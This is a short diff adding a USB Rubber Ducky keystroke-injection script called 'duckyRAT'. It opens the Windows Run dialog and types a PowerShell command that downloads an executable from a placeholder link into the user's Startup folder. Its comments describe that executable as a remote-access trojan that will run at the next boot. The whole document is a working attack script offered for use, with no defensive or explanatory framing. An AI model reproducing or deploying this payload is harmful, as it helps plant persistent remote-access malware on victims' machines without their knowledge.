@@ -1,0 +1,9 @@
+REM duckyRAT
+REM code for USB Rubber Ducky
+REM replace stuff in all caps with links specified
+REM warning: this script doesnt actually run the RAT, but it puts it into the startup folder so it will be run on the startup of the computer
+REM made with ❤ by untitled
+DELAY 1500
+GUI r
+DELAY 100
+STRING powershell (new-object System.Net.WebClient).DownloadFile('LINK TO COMPILED AUTOIT EXE FILE','c:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/NAME OF YOUR COMPILED EXE FILE.exe')
